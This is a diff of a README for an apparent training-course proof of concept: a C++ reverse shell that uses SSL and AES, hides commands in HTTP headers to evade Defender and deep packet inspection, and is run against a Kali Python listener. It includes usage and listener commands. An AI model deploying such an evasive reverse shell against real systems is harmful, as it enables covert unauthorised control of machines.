@@ -13,8 +13,9 @@ An encrypted reverse shell helps evade such detection by:
 2. Using SSL to blend in with legitimate HTTPS traffic.
 
 To address this gap, I created a simple **C++ SSL Reverse Shell** POC (commented and explained):
-- **Undetectable** by Microsoft Defender and some other AV solutions at the time of publishing.
+- **Undetected** by Microsoft Defender and some other AV solutions at the time of publishing.
 - Enables secure communication via SSL, reducing the chance of detection.
+- Using AES Encryption / Decryption and embedding the results and commands within HTTP headers to bypass deep packet inspection
 
 > **Note**: I tested the binary against a limited set of antivirus solutions, and results may vary across environments.
 
@@ -71,20 +72,30 @@ C:\OpenSSLWin64\install\lib\libcrypto.lib
 ![Local Image](./images/Linker2.png "Linker.png")
 
 ---
+## Usage
+
+```
+.\SSLReverseShell.exe 192.168.33.146 443
+```
+
+---
+## POC
+
+This C++ Project will connect to the python server and initiate a ssl connection, taking commands from the server (attacker) and sending the results to the attacker through ssl tunnel encrypted with aes.
+
+---
 
 ## Capture the reverse shell in your Kali OS
 
 1- Generate a New RSA Private Key and Self-Signed Certificate (Containing the Public Key)
-```
+
 openssl req -newkey rsa:2048 -nodes -keyout attacker.key -x509 -days 365 -out attacker.crt
+
+2- Python Script will be the server to capture the shell and send the command back to client (encrypted with aes)
 ```
-2- Combine the Private Key and Certificate into a PEM File
-```
-cat attacker.crt attacker.key > attacker.pem
-```
-3- Start an OpenSSL SSL Server on Port 443
-```
-openssl s_server -accept 443 -cert attacker.crt -key attacker.key -cipher ALL -quiet
+┌──(kali㉿kali)-[~/Desktop/pen-300/sslrevshell]
+└─$ python3 sslserverv1.3.py      
+[*] Listening on 0.0.0.0:443
 ```
 ---
 
